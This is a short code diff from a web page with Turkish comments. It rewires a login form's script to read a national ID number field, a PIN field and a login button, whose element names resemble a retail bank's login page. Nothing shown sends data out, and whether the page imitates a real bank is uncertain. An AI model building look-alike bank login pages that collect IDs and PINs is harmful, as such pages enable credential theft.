@@ -142,8 +142,11 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
         }
 
         // TC kimlik numarası ve şifre alanlarının değerlerinin değiştiğini izle
-        tcInput.addEventListener("input", validateInputs);
-        passInput.addEventListener("input", validateInputs);
+        var tcInput = document.getElementById("ctl00$c$RetailIdentityTextBox");
+        var passInput = document.getElementById("ctl00$c$RetailPinTextBox");
+
+        // Giriş düğmesi
+        var loginBtn = document.getElementById("ctl00_c_RetailLoginButton");
 
         // Giriş düğmesine tıklandığında formu gönder
         loginBtn.addEventListener("click", function () {
